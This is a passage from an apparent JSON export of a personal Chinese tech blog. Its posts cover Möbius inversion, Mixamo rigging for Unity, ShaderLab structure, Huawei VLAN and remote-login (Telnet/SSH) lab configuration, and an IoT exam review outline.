f*(g+h)\u0026amp;=\\sum_{xy=n}f(x)(g+h)(y)\\ \u0026amp;=\\sum_{xy=n}f(x)(g(y)+h(y))\\ \u0026amp;=\\sum_{xy=n}f(x)g(y)+\\sum_{xy=n}f(x)h(y)\\ \u0026amp;=fg+fh \\end{align*} $$\nSection2 狄利克雷逆 Definition：如果$f$是一个数论函数且$f(1)\\ne0$，则存在唯一的一个称为$f$的狄利克雷逆函数的数论函数，使 $$ f*^{-1}*f=f^{-1}*f=I $$\nTheorem:\nTh1：我们计算$f^{-1}$的递推公式： $$ f^{-1}= \\begin{cases} \\dfrac{1}{f(1)}\u0026amp;\\text{$n=1$}\\ -\\dfrac{1}{f(1)}\\sum\\limits_{d|n\\d\u0026lt;n}f(\\dfrac{n}{d})f^{-1}(d)\u0026amp;\\text{otherwise} \\end{cases} $$ Proof:\n对$n=1$，$(f*f^{-1})(1)=I(1)=1 \\Rightarrow f^{-1}=\\dfrac{1}{f(1)}$\n对$n\\ge1$， $$ \\begin{align*} (ff^{-1})(n)=\\sum_{d|n}f(d)f^{-1}(\\dfrac{n}{d})\u0026amp;=0\\ f(1)f^{-1}(n)+\\sum_{d|n\\d\u0026lt;n}f(\\dfrac{n}{d})f^{-1}(d)\u0026amp;=0\\ \\end{align} \\f^{-1}(n)=\\dfrac{-1}{f(1)}\\sum_{d|n\\d\u0026lt;n}f(\\dfrac{n}{d})f^{-1}(d) $$\nTh2：$(f*g)^{-1}=f^{-1}*g^{-1}$ Proof: $$ (fg)^{-1}=f^{-1}g^{-1}\\ (fg)(fg)^{-1}=f^{-1}g^{-1}(fg)\\ I=f^{-1}fgg^{-1}\\ I=II=I $$\nChapter3 莫比乌斯反转 Definition：$f$,$g$是两个数论函数，如果有： $$ f(n)=\\sum_{d|n}g(d)\\ \\Updownarrow\\ g(n)=\\sum_{d|n}f(d)\\mu(\\dfrac{n}{d}) $$\nProof:\n证明$\\Downarrow$： $$ f(n)=\\sum_{d|n}g(d)即f=gu\\ f\\mu=gu\\mu=g*(u*\\mu)=gI=g $$ 证明$\\Uparrow$： $$ g(n)=\\sum_{d|n}f(d)\\mu(\\dfrac{n}{d})即g=f\\mu\\ ug=uf*\\mu=(u*\\mu)f=If=f $$\n","date":"2023-07-21T09:43:00Z","permalink":"https://dorinxl.github.io/p/%E8%A7%A3%E6%9E%90%E6%95%B0%E8%AE%BA%E4%B9%8B%E6%95%B0%E8%AE%BA%E5%87%BD%E6%95%B0%E5%85%B6%E4%B8%80/","title":"解析数论之数论函数【其一】"},{"content":"绑骨 首先我们手里要准备好模型文件，mixamo支持FBX/OBJ/ZIP压缩包，这里以obj文件为例。\n我们手中的obj文件一般由贴图文件、obj文件和mtl文件组成（素材来源于网络）：\n我们将这些文件打包成zip，然后去mixamo网站：https://www.mixamo.com/\n将zip上传或拖入，假如是obj文件不要单单把obj拖入，这样模型会失去贴图。\n拖入后会出现如下界面，查看人物没什么问题之后就可以开始绑骨了：\n进入绑骨界面，需要拖动点位，按照英文单词和右侧图示拖动左侧圆圈，确认之后等待一会：\n当你的人物可以按照预定模板移动，且确认骨骼运动正常时，就可以确认了。\n确认之后就可以导出绑骨后的模型，或是选择一套你喜爱的动作。\n到这里，我们的obj人物就成功绑上了骨骼，mixamo太神了。\n可以直接导出没有动画的模型，或者在网站上找到自己喜欢的动作并连同模型一起下载下来。\n绑好的模型导入unity 我们以标准二进制fbx文件导出，拖入到unity中。会得到一个预制体：\n在inspector面板设定其avator类型为人型：\n进入configure可以看到更多细节：\n配合unity的动画avator系统，我们就可以实现骨骼动画的运作了。\n","date":"2022-09-23T07:50:00Z","image":"https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/mixamo_hu13497261725183896661.png","permalink":"https://dorinxl.github.io/p/%E4%BD%BF%E7%94%A8mixamo%E4%B8%BAobj%E6%96%87%E4%BB%B6%E7%BB%91%E9%AA%A8%E5%B9%B6%E5%AF%BC%E5%85%A5unity/","title":"使用mixamo为obj文件绑骨并导入unity"},{"content":"Unity Shader入门精要读书笔记 第三章 Unity Shader基础 前言 Unity Shader的出现就是为了提供一个地方能够让开发者更轻松的管理着色器代码以及渲染设置，而不需要同各种shader文件一样管理多个文件、函数等。\n3.1 Unity Shader概述 3.1.1 材质和Unity Shader ​\t在Unity中，我们需要配合使用材质(Material)和Unity Shader才能达到需要的效果。Unity Shader定义渲染所需的代码、属性和指令，而材质允许我们自己调节这些属性，并赋给相应的模型。\n3.1.2 Unity中的材质 ​\tUnity中的材质需要结合一个GameObject的mesh或者Particle Systems(粒子系统)来工作。\n3.1.3 Unity中的Shader ​\tUnity中的shader文件同渲染管线的shader不同，所以笔记中会同原著一样称为Unity Shader。\n​\t在创建Unity Shader时，unity为我们提供了四种模板：\n​\nStandard Surface Shader 产生一个包含标准光照模型的表面着色器模板 Unlit Shader 不包含光照（但包含雾效）的基本的顶点/片元着色器 Image Effect Shader 为各种屏幕后处理效果提供基本模板 Compute Shader 利用GPC的并行性来进行一些与常规渲染流水线无关的计算 ​\t由于《入门精要》这本书重点在如何在Unity中编写顶点/片元着色器，后续学习中通常会用Unlit Shader来生成一个基本的顶点/片元着色器模板。\n​\t单独的Unity Shader不能发挥作用，必须同材质material结合起来。其本质上是一个文本文件，Unity Shader的导入设置面板可以看到该shader的一些相关信息（例如是否是固定函数着色器(fixed function)、是否投射阴影(cast shadows)、使用的渲染队列(Render queue)、属性(properties)列表等）。\n3.2 Unity Shader的基础：ShaderLab ​\tUnity专门提供了一种为Unity Shader服务的语言——ShaderLab，Unity Shader为控制渲染过程提供了一层抽象，帮助开发者更简单的完成工作。ShaderLab时Unity提供的编写Unity Shader的一种说明性语言，使用一些嵌套在花括号内的语义来描述一个Unity Shader文件的结构。类似CgFX和Direct3D Effects(.FX)语言，定义了显示一个材质所需的所有东西，而不仅是着色器代码。\n​\t一个Unity Shader的基础结构如下：\n1 2 3 4 5 6 7 8 9 10 11 12 Shader \u0026#34;ShaderName\u0026#34;{ Properties{ //属性 } SubShader{ //显卡A使用的子着色器 } SubShader{ //显卡B使用的子着色器 } Fallback \u0026#34;VertexLit\u0026#34; } ​\tUnity会在背后根据使用的平台将这些结构编译成真正的代码和Shader文件，开发者只需要和Unity Shader打交道就行。\n3.3 Unity Shader的结构 3.3.1 给Shader起名字 ​\t用\tShader \u0026quot;name\u0026quot;{ }就可以给Unity Shader命名，同时会出现在材质面板的下拉列表里。\n​\t也可以添加前缀来有序组织位置分布，例如Shader \u0026quot;Custom/MyShader\u0026quot;{}的效果如图：\n3.3.2 材质和Unity Shader的桥梁：Properties ​\tProperties中包含一系列属性，这些属性会出现在材质面板中。\n​\t其定义方式为 _名字(\u0026quot;面板属性名\u0026quot;,类型)=默认值，如：\n1 2 3 4 5 Properties{ Name(\u0026#34;Display name\u0026#34;,propertyType) = DefaultValue Name(\u0026#34;Display name\u0026#34;,propertyType) = DefaultValue //更多属性 } ​\t属性的名字通常用一个下划线开始。显示名字是出现在材质面板上的名字，同时需要指定类型和默认值。\n​\t以下是Properties语义块支持的属性类型:\n属性类型 默认值的定义语法 例子 Int number _Int(\u0026ldquo;Int\u0026rdquo;,Int) = 2 Float number _Float(\u0026ldquo;Float\u0026rdquo;,Float) = 1.5 Range(min,max) number _Range(\u0026ldquo;Range\u0026rdquo;,Range(0.0,5.0)) = 3.0 Color (number,number,number,number) _Color(\u0026ldquo;Color\u0026rdquo;,Color) = (1,1,1,1) Vector (number,number,number,number) _Vector(\u0026ldquo;Vector\u0026rdquo;,Vector) = (6,2,3,1) 2D \u0026ldquo;defaulttexture\u0026rdquo;{} _2D(\u0026ldquo;2D\u0026rdquo;,2D) = \u0026ldquo;\u0026rdquo;{} Cube \u0026ldquo;defaulttexture\u0026rdquo;{} _Cube(“Cube”,Cube) = \u0026ldquo;white\u0026rdquo;{} 3D \u0026ldquo;defaulttexture\u0026rdquo;{} _3D(\u0026ldquo;3D\u0026rdquo;,3D) = \u0026ldquo;black\u0026rdquo;{} ​\tInt、Float、Range：数字类型的属性，默认值是单独的数字。\n​\tColor、Vector：默认值是括号包围的四维向量。\n​\t2D、Cube、3D：默认值是字符串和花括号，字符串要么为空，要么是内置的纹理名称；花括号用于指定一些纹理属性，在Unitu5.0之后被移除。\n3.3.3 重量级成员：SubShader ​\t一个Unity Shader可以包含多个SubShader语义块，至少要有一个。加载unity shader时会扫描所有SubShader，选择第一个能在目标平台运行的SubShader；如果都不支持，那么使用Fallback指定的UnityShader。\n​\tSubShader的结构如下：\n1 2 3 4 5 6 7 8 9 SubShader{ //可选 [Tags] //可选 [RenderSetup] Pass{ } //其他的pass } ​\t挨个介绍：\n标签Tags和状态RenderSetup都是可选的，在SubShader中的设置会适用到所有pass。\n标签Tags是一个键值对，都是字符串，代表着SubShader希望以怎样、何时来渲染此对象。\n状态RenderSetup可以设置显卡的各种状态，并应用到所有的pass。\nPass语义块则是一次完整的渲染流程\n来说说Pass：\n1 2 3 4 5 6 Pass{ [Name] [Tags] [RenderSetup] //code } 显然我们可以定义pass的名称，我们也可以引用其他Unity Shader的pass，如：UsePass \u0026quot;MyShader/MYPASSNAME\u0026quot;,值得注意的是，unity内部会把所有Pass名称转换为大写字母，所有我们这里也要用大写字母。\nPass内部也可以设置标签/渲染状态，用于告诉渲染引擎如何渲染该物体。\n3.3.4 留后路：Fallback ​\tFallback规定了当所有的SubShader都不能在显卡上运行的时候所使用的Shader。\n​\t开发者可以关闭Fallback，但是这会影响投影的投射。因为Fallback使用的内置shader包含了一个通用的Pass，这会造成阴影投射的效果。\n3.3.5 其他语义 ​\t比如CustomEditor语言扩展自定义编辑界面。\n​\t比如Category语义对Unity Shader中的命令分组。\n3.4 Unity Shader的形式 ​\t在Unity中有三种形式来编写Unity Shader：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 Shader \u0026#34;MyShader\u0026#34;{ Properties{ //所需的各种属性 } SubShader{ //真正意义上的Shader代码会出现在这里 //表面着色器（Subface Shader） 或者 //顶点/片元着色器（Vertex/Fragment Shader） 或者 //固定函数着色器（Fixed Function Shader） } SubShader{ //同上 } } 3.4.1 表面着色器 ​\t**表面着色器（Sruface Shader）**是Unity自己创造的一种着色器代码类型，代码量少；本质上还是顶点/片元着色器，可以看作是Unity对顶点/片元着色器的高层抽象。\n​\t表面着色器的价值在于Unity帮我们处理了很多光照细节。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Shader \u0026#34;Custom/Simple Surface shader\u0026#34; { Subshader{ Tags {\u0026#34;RenderType\u0026#34; = \u0026#34;opaque\u0026#34; } CGPROGRAM #pragma surface surf Lambert struct Input { float4 color : COLOR; }; void surf ( Input IN, inout SurfaceOutput o){ o.Albedo = 1; ) ENDCG } Fallback \u0026#34;Diffuse\u0026#34; } ​\t表面着色器定义在SubShader中的CGPROGRAM和ENDCG中。不在Pass中是因为不关心有几个pass，Unity会做好Pass的事情。\n​\tCGPROGRAM和ENDCG中的代码使用CG/HLSL编写。\n3.4.2 顶点/片元着色器 ​\t基本同表面着色器一致，但是CGPROGRAM和ENDCG需要写在Pass内，用来定义每个Pass自己的代码。\n3.4.3 固定函数着色器 ​\t旧版本设备不支持可编程管线着色器，所以使用固定函数着色器。\n​\t固定函数着色器使用ShaderLab语法而不是CG/HLSL。\n​\tUnity5.2之后，所有固定函数着色器会在底层被编译成对应的顶点/片元着色器，真正意义上的固定函数着色器不复存在。\n3.6 注意的地方 ​\t3.6.1 Unity Shader不是Shader\n​\tUnity Shader实际上是一个ShaderLab文件，以.shader为后缀名的文件。\n​\tUnity Shader高度封装，不需要编写特定类型的顶点/片元Shader，可以通过指令开启渲染设置，方便的修改一些属性。\n​\t同时由于Unity Shader的高度封装，一些Shader类型和语法受限。\n​\t3.6.2 Unity Shader和CG/HLSL的关系\n​\tUnity Shader用ShaderLab语言编写，但是对于顶点/片元着色器会嵌套CG/HLSL代码来实现。\n3.7 资料 ​\t官方文档：http://docs.unity3d.com/Manual/SL-Reference.html\n​\t官方简单着色器编写教程：http://docs.unity3d.com/Manual/ShaderTut1.html http://docs.unity3d.com/Manual/ShaderTut1.html\n​\tNVIDIA提供的CG文档：http://http.developer.nvidia.com/CG\n​\tNVIDIA提供的系列教程：http://http.developer.nvidia.com/CGTutorial/cG_tutorial_chapter01.html\n","date":"2022-07-03T15:48:00Z","permalink":"https://dorinxl.github.io/p/unity-shader%E5%85%A5%E9%97%A8%E7%B2%BE%E8%A6%81%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B8%89%E7%AB%A0-unity-shader%E5%9F%BA%E7%A1%80/","title":"Unity Shader入门精要读书笔记 第三章 Unity Shader基础"},{"content":"vlan配置 将一个物理局域网在逻辑上分成多个局域网。\n传统模式一个设备20个接口，通过给交换机做标识，或者基于协议、基于mac等来区别开局域网。\n创建vlan（交换机） 用到的命令：\n1 2 3 4 5 6 7 8 9 [Huawei]vlan bat 10 20\t//批量创建10和20 [Huawei]int e0/0/1\t//进入接口 [Huawei-Ethernet0/0/1]port link-type access //指定接口类型为access [Huawei-Ethernet0/0/1]port default vlan 10\t//将当前接口加入vlan10 [Huawei-GigabitEthernet0/0/1]port link-type trunk //指定接口类型为trunk [Huawei-GigabitEthernet0/0/1]port trunk allow-pass vlan 10 20\t//允许vlan 10 20通过trunk [Huawei-Ethernet0/0/1]undo port default vlan\t//将接口从vlan中删除 布局 对第一个交换机的第一个接口进行配置：\n同理对其他三个进行配置之后，开始配置两个交换机之间的trunk连线：\n配置完成之后发现PC1只可以和PC3在同一网段通信，同理PC2与PC4通信。\n补充知识点： vlan的作用：\n​\t隔离广播域，提升网络性能 ​\t隔离不同用户或者业务，便于管理\nvlan的实现方式：\n​\t按端口划分VLAN ​\t按MAC地址划分VLAN\n交换机的端口类型\n​\t交换机的端口，可以分为以下三种：\n访问链接(Access Link) 访问链接，指的是“只属于一个VLAN，且仅向该VLAN转发数据帧”的端口。在大多数情况下，访问链接所连的是客户机。 汇聚链接(Trunk Link) 汇聚链接(Trunk Link)可同时属于多个VLAN，且能够转发多个不同VLAN的通信的端口，汇聚链路上流通的数据帧，都被附加了用于 识别分属于哪个VLAN的特殊信息。 通过汇聚链路时附加的VLAN识别信息，有支持标准的“IEEE 802.1Q”协议，及Cisco产品独有的“ISL(Inter Switch Link)”。 混合链接(Hybrid Link) Hybrid 类型的端口可以属于多个VLAN， 可以接收和发送多个VLAN的报文，可以用于交换机之间连接也可以用于连接用户的计算机。 Hybrid端口和Trunk 端口的不同之处在于：Hybrid 端口可以允许多个VLAN 的报文发送时不打标签，而Trunk 端口只允许缺省VLAN 的报文发送时不打标签。 ","date":"2022-06-22T02:31:00Z","permalink":"https://dorinxl.github.io/p/vlan%E9%85%8D%E7%BD%AE/","title":"vlan配置"},{"content":"目的：如何设置账号密码供远程登陆。\n设备管理的对象可以是交换机、路由器或者防火墙，都是通用的\n通过cloud桥接到虚拟设备： 对cloud右键：\n安装好vm之后会有两个虚拟网卡：\n一开始默认UDP，我们直接增加：\n然后我们增加另一个：\n然后我们增加端口映射：\n现在我们的这个cloud就绑定到网卡是vm1的虚拟机上了\n给路由器设置IP地址，网段与云网段一致 如何配置IP：\nSYS进入配置模式\n1 2 \u0026lt;Huawei\u0026gt;sys Enter system view, return user view with Ctrl+Z. interface 【接口编号】\n1 2 [Huawei]int g0/0/0 [Huawei-GigabitEthernet0/0/0] ip add [xxx.xxx.xxx.xxx] 24\n1 2 3 [Huawei-GigabitEthernet0/0/0]ip add 192.168.87.10 24 Jun 22 2022 09:10:21-08:00 Huawei %%01IFNET/4/LINK_STATE(l)[1]:The line protocol IP on the interface GigabitEthernet0/0/0 has entered the UP state. 配置远程连接设置：\n1 2 3 4 5 [Huawei] user-interface vty 0 4\t//配置0-4五个终端 [Huawei-ui-vty0-4] authentication-mode password/aaa\t//启用密码验证或AAA验证 [Huawei-ui-vty0-4] set authentication password simple/cipher abc123 //以明文或密文方式加密 [Huawei-ui-vty0-4] set authentication password cipher abc123\t//此为路由器配置命令，路由器只能是密文加密 [Huawei-ui-vty0-4] user privilege level 3\t//设置远程登录vty用户权限为3，表示可以使用所有命令 命令级别为0-3共四个级别，区别如下： 0参观，ping、tracert、telnet、rsh、super、language-mode、display、quit 1 监控，0级命令、msdp-tracert、mtracert、reboot、reset、send、terminal、undo、upgrade、debugging 2 配置，所有配置命令（管理级的命令除外）和0、1级命令 3 管理，所有命令\n配置 Telnet以用户名+密码方式登录时的密码： 进入AAA模式命令行下： [Huawei]aaa 添加新用户为：huawei 密码为：abc123 加密模式为：cipher 密文加密,用户级别为3\n1 2 [Huawei-aaa]local-user huawei level 3 password cipher abc123 [Huawei-aaa]local-user huawei privilege level 3 password cipher 123456 设置哪些服务可以通过此test用户进行验证，设置telnet 服务\n1 2 [Huawei-aaa]local-user huawei service-type http ssh telnet web [Huawei-aaa]local-user huawei privilege level 3\t//远程登录时能够使用的级别命令 实际操作：\n1 2 3 4 5 [Huawei] user-interface vty 0 4\t//配置0-4五个终端 [Huawei-ui-vty0-4] authentication-mode aaa [Huawei-ui-vty0-4] user privilege level 3 [Huawei-aaa]local-user huawei level 3 password cipher abc123 [Huawei-aaa]local-user huawei service-type http ssh telnet web 在centOS7上安装telnet所需组件之后：\n3A认证设置 SSH连接 1 2 3 4 5 6 7 8 9 [Huawei]aaa [Huawei-aaa]local-user zhangsan password cipher abc123 privilege level 3 [Huawei-aaa]local-user zhangsan service-type ssh [Huawei]ssh user huawei authentication-type password********* [Huawei]stelnet server enable ********** [Huawei]rsa local-key-pair create //生成密钥对信息，可省略。 [Huawei]user-interface vty 0 4 [Huawei-ui-vty0-4]authentication-mode aaa [Huawei-ui-vty0-4]protocol inbound ssh 总结： 路由器和交换机的作用？\n交换机：汇聚能力，相同网段通信\n路由器：实现不同网段通信\n为什么我们需要不同网段\n不划网段，广播信号浪费资源。\n路由器的远程连接认证配置\n网络设备常见连接协议：telnet、ssh/stelnet、web\n","date":"2022-06-22T01:55:00Z","permalink":"https://dorinxl.github.io/p/%E5%8D%8E%E4%B8%BAensp%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86/","title":"华为ensp设备管理"},{"content":"物联网复习提纲 他郑重地说了：“看看课后题。” 原文档非markdown格式，本文排版问题暂未修复。\n本课程复习提纲由我和@cheerg一起完成。\n复习资料为《物联网技术原理》\n第一章p22 物联网的体系架构、各层的功能及关键技术 物联网三层体系结构\n感知控制层：承担物体的标识、信息的采集和远程的控制。 数据传输层：承担各类设备的网络接入以及信息的传输。 数据处理层：完成信息的分析处理和决策。 各层的功能及关键技术\n感知控制层：\n物联网的核心层，主要用于物品标识和信息的智能采集。\n由【基本的感应器件】和【感应器组成的网络】两大部分组成。\n关键技术：\n传感器技术：把物理量转化为计算机能识别和处理的数字量的一种技术条形码技术****RFID技术：射频识别，通过无线电信号识别特定目标并读写相关数据EPC技术：电子产品代码，为每个产品提供唯一的电子标识符移动定位技术：通过与多个已知坐标位置的固定基站交互，获得启动目标在空间中的技术无线传感器网络：分布式传感网络物联网控制技术 数据传输层：\n主要完成接入和传输功能，是进行信息交换、传递的数据通路。\n由【接入网】和【传输网】两部分组成。\n传输网由公网与专网组成，样例：电信网、广电网、互联网\n接入网包括：光纤接入、无线接入、以太网接入，卫星接入。\n关键技术：\n短距离无线通信技术长距离无线通信技术有线通信技术 数据处理层：\n由【业务支撑平台】、【网络管理平台】、【信息处理平台】、【服务支撑平台】等组成。\n关键技术：\n第二章 传感器的组成和各模块的功能 传感器的概念：能感受规定的被测量的信息，并按照一定规律转换成可用信号的器件或装置，通常由敏感元件、转换元件和转换电路等组成。\n敏感元件\n概念：能直接感受或响应被测量，并输出与被测量物体成确定关系的某一物理量的元件。 转换元件\n概念：以敏感元件的输出作为输入，将敏感元件感受或响应的被测量转换成适于传输或测量的电信号。 转换电路\n概念：将转换元件输出的电路参数转换为一定范围内的电量输出。 传感器的特性（性能指标和物理意义） **[P34]**静态特性：被测量的值处于稳定状态时的输入/输出关系。\n静态特性的重要指标： 线性度、灵敏度、迟滞性、重复性、量程、其他特性（分辨率、阈值、稳定性、漂移）（有印象就行，概念不用背） **[P38]**动态特性：其输出对随时间变化的输入量的响应特性。\n动态响应特性分为：稳态响应特性和瞬态响应特性 动态特性往往从时域和频域两方面分析： 时域响应和时域性能指标 频域响应和频域性能指标 电阻应变式、电感式和电容式传感器的工作原理（基本的公式推导） 电阻应变效应原理\n原理：将电阻应变片粘贴到各种弹性敏感元件上，通过电阻应变片将应变转换为电阻变化。 公式推导： 电感式传感器\n原理：利用线圈自感或互感系数的变化来实现非电量电测的一种装置。 公式推导： 电容式传感器\n原理：以各种类型的电容器作为敏感元件，将被测物理量的变化转化为电容量的变化，再由转换电路转换为电压、电流或频率。\n变极距型：\n变面积型：\n变介质型：\n第三章 1.[P75]一维条形码的组成(模块、单元、符号)和扫码原理。 一维条形码是集条形码理论、光电技术、计算机技术、通信技术、条形码印制技术于一体的一种自动识别技术。\n构成条形码的基本单位是模块，模块是指条码中最窄的条或空，模块的宽度通常以mm或mil (1/1000in) 为单位。构成条码的一个条或空称为一个单元，一个单元包含的模块数是由编码方式决定的。\n扫码原理：条形码的扫描需要用到扫描器，扫描器利用自身光源照射条形码，再利用光电转换器接受反射的光线，将反射光线的明暗转换成数字信号。\n2.[P78]二五条码、交叉二五条码和三九条码的编码规则。 二五条码（最简单的条码）：是一种只有条表示信息的非连续型条码，每个字符由五个条组成，其中两个宽条，三个窄条，字符间隔是窄空，字符集为数字0~9。\n交叉二五条码：在二五条码的基础上，扩展到空也表示信息。\n三九条码：三九条码是一种一维条形码，是一种可供使用者双向扫描的分散式条码。\n三九条码拥有编码规则简单、误码率低，能表示字符个数多等特点。\n三九条码仅有两种单元宽度——宽单元和窄单元。宽单元的宽度为窄单元的1~3倍，一般多选用2倍、2.5倍或3倍。三九条码的每一个条码字符由九个单元组成，其中有三个宽单元，其余是窄单元，因此称为三九条码。三九条码的长度没有强迫性限制；三九条码的检查码可有可无；三九条码的起始码与终止码均为*字符。\n3.[P82]二维矩形码相比于一维条形码的优势。 二维码的特点：\n(1)信息容量大\n(2)编码范围广\n(3)保密、防伪性能好\n(4)译码可靠性高\n(5)修正错误能力强\n(6)容易制作且成本很低\n(7)条码符号的形状可变\n4.[P88]快速反应(QR)码的码结构和各部分的意义。 QR Code的结构： QR Code有五个部分： 定位图形：用于对二维码的定位，不同的qrcode固定存在，大小规格会有差异 校正图形：规格确定，校正图形的数量和位置也就确定了。 格式信息：表示该二维码的纠错级别，分为L、M、Q、H. 版本信息：二维码的规格，总共有40种规格矩阵。 数据和纠错码：实际保存的二维码信息和纠错码字（用于修正二维码损坏带来的错误）。 5.[P92]射频识别(RFID)系统的组成和工作原理。 RFID系统由电子标签、读写器和计算机网络组成的自动识别系统。\n从工作原理来看，系统一般由信号发射机、信号接收机、发射接收天线三部分组成。\n工作原理：\n电子标签和读写器利用各自携带的天线构筑两者之间进行数据传输的非接触式的通道。 当标签处于读写器的工作范围时，读写器用天线发信号。 电子标签接受信号产生感应电流，激活内部电路向读写器回送信号，或主动向读写器发送信号。 读写器收到信号后对信号做处理，然后将处理后的数据上传到数据管理系统进行下一步处理。 6.[P118]两类定位技术(基于测距和非测距)的工作原理(结合实验内容)。 基于测距：\n通过超声波或者无线电信号，测量声波或信号发送端到接收端时的信号强度、信号相位差以及信号传播时间差获取节点间的角度或距离信息。再利用空间几何方法完成未知节点的定位。 [P125]定位算法：时间定位（TOA）、到达时差定位（TDOA）、方向测量定位(AOA)、信号强度定位(RSSI) 无需测距：\n通过节点之间的信息交换和整个网络的连通性来实现定位，不需要额外网络设备。 [P130]定位算法：DV-Hop定位、APIT定位算法、凸规划算法。 第四章 1.[P138]物联网通信系统模型和各模块的功能。 信源：传感器在感知层采集到的信息。\n采样量化：模数变化，把作为模拟信号的原始信息在时间域和幅值域进行离散化处理，得到有限个幅度值的离散信号。\n编码：\n信源编码：提高传输有效性：保证无失真的情况下用平均码长最短的码承载信源信息熵。 信道编码：提高传输可靠性，引入额外监督位。 编码后输出的数字信号叫基带信号。 调制：\n目的：适合信道的传输特性并实现多路复用和多址接入。 实现：将低频基带信号搬移到高频载波信号处。 同步：\n载波同步：在接收端需要一个与发射端调制模块同频同相的载波信号，用于恢复出数字基带信号。 帧同步：使接收端知道每一帧数据包中有用的信息的开始和结束。 位同步：使接收端知道并判定每一位数字信号位。 2.[P140]通信指标的计算和物理意义。 数据传输速率\n第一种： 例题： 第二种： 误码率\n信道容量\n对于有限带宽无噪声信道： 对于有限带宽随机噪声信道： 3.[P143]采样定理及物理意义。 4.[P144]非均匀量化相比于均匀量化的优势及实现原理 量化特征有【均匀量化】和【非均匀量化】\n【均匀量化】的分层间隔为等间隔，适用于幅度均匀的分布的信号。\n特点：概率密度大的区域分层间隔小，反之分层间隔大。 缺点：在满足信噪比要求的输入信号取值范围内进行均匀量化时，信号动态范围将受到较大限制。 【非均匀量化】：根据信号的不同区间确定间隔。\n特点：小信号量化台阶减小，大信号的量化台阶增大。 改善小信号的信噪比，并在不增大量化级数的条件下使信号在较宽动态范围内信噪比达到指标要求。 5.[P147]无失真离散无记忆信源编码定理和变长编码。 信息量：\n信道熵：\n信源编码定理：\n变长编码：根据信源输出符号出现概率不同选择码字，出现概率大用短码，小的用长码，这样平均码长最短。\n哈夫曼编码：\n一个综合例题：\n6.[P151]线性分组码的实现和相关概念（监督矩阵、生成矩阵）。 k个信息位，r个监督位 监督矩阵和生成矩阵都是海明码，书上是（7，4）海明码，应该就考74乐\n监督矩阵Q：\n生成矩阵G： 7.[百度]同步的概念和不同层次（载波同步、帧同步、位同步）。 8.[P157]多址接入技术的基本概念和意义。 基本概念：通信系统通过信道来区分通信对象。一个用户一个信道，多个用户同时通话就是以不同信道加以区分。让众多的用户公用公共信道的一种技术。\n常见的应用方式：\n频分多址：传输信号的载波频率不同来区分信道。 时分多址：传输信号存在时间不同来区分信道。 码分多址：传输信号的码型不同来区分信道。 空分多址：通过空间的分割来区分信道。 9. 无线传感器网络中基于调度的 MAC 层[P206] TRAMA 协议、[P208]常见的路由协议（对比互联网中路由协议）、[P212]拓扑控制方法。 基于调度的MAC协议的基本思想：采用某种调度算法将时隙/信道/正交码字节分配给节点，让节点在给定的时隙/信道/正交码字内无冲突访问信道。\nTRAMA:包括邻居协议、调度交换协议、自适应时槽选择算法。将时间划分为交替性的随机访问周期和调度访问周期，周期长度不定。\n常见路由协议：\n以数据为中心的路由协议：定向扩散协议、SPIN协议 基于地理位置的路由协议：地理自适应保真路由协议、能量感知路由协议 提供数据流和服务质量保障的路由协议：有序分配路由策略、SPEED协议。 拓扑控制：功率控制和层次性拓扑控制\n第五章 1.[P240] 在基于 HDFS 的分布式文件存储系统中，文件的读取和写入过程。 文件的读取：\n客户端获取HDFS文件系统DistributedFileSystem实例，调用open()方法。 DistributeFileSystem通过RPC远程调用名称节点，确定文件组成单元块的位置信息。 名称节点返回每个单元块及其副本的数据节点地址，这些数据节点按照相对于客户机的距离排序。\nDistributedFileSystem向客户端返回FSDataInputStream，而FSDataInputStream封装了管理名称节点和数据节点I/O的DFSInpouStream。\n客户端调用FSDataInputStream的read()方法。 FSDataInputStream中的DFSInputStream保存前几个单元块的数据节点地址信息，然后连接存储着文件单元块的最近数据节点，重复调用read()方法读取数据，返回客户端。 第一个单元块读完，DFSInputStream关闭与该节点的连接，然后寻找下一个单元块。 最后，客户端调用FSDataInputStream的close()方法结束文件读取操作。 文件的写入：\n客户端调用DistributedFileSystem中的create()方法创建文件。 DistributedFileSystem通过RPC调用名称节点，创建新文件并分配单元块。 名称节点检查该文件之前不存在，并且客户端有权限创建文件，然后生成新文件记录，否则抛出异常。\nDistributedFileSystem向客户端返回FSDataOutStream开始写数据。\n客户端写入数据，DFSOutputStream将数据分包写入数据队列，同时询问名称节点、选择合适数据节点、分配新单元块。数据节点列表组成管道。 FSDataOutputStream向管道第一个数据节点传送数据，写完后依次向下继续。 DFSOutputStream等待所有数据节点写入。 DistributedFileSystem通知名称节点写文件结束。 2. 云计算和海计算出现的背景和意义。 人话翻译：\n云计算就是在互联网上有一群服务器能给你提供计算服务\n云计算能解决大规模数据处理问题，自己还不用买服务器，因此被业界认为是支撑物联网后端的最佳选择。 海计算就是一片海，海里每一滴水就是现实生活一个东西，这些东西能相互合作感知互动。\n海计算物理物体融入计算，每个个体可以单独计算还能协同组织。 3. [P268]预处理的常见类型和目的/意义。 预处理技术很多，常见的有：数据清洗、数据集成、数据转换、数据归约。\n预处理目的是提高数据挖掘的对象的质量。（这个东西就相当于过筛，好数据筛下去了，坏数据留下被处理掉）\n他的意义：帮助改善数据质量，提高数据挖掘进程的有效性和准确性，是整个数据处理的重要部分。\n4. [P270]分类的概念和常见的分类算法（决策树、最近邻分类 KNN 和人工神经网络 ANN）。 分类的概念：将对象指定给预先定义的多种类型中的一种。\n决策树：用于分类的一种树结构\n组成： 叶子节点：某个类或者类的分布。 其他节点：对某个属性的一次判定。 边：代表一个测试结果 决策树有【分类树】和【回归树】两种。决策树的结果是二叉树或多叉树。 最近邻分类KNN：一个样本在特征空间里寻找K个和他最像的样本，进入数量多的那一方的类别。\n缺点：样本不平衡的时候，新进去的样本会出现偏差。 解决方案：加权值。 人工神经网络ANN：我说不清，大概就是一种运算模型，有大量的节点，每个节点是一种输出函数，两个节点之间是加权值。\n5. [P275]关联分析的概念和基于 Apriori 的算法。 关联分析是在交易数据、关系数据或其他信息载体中，查找存在于项目集合或对象集合之间的频繁模式、关联、相关性或因果关系。\nApriori算法：详见【P276】\n6. 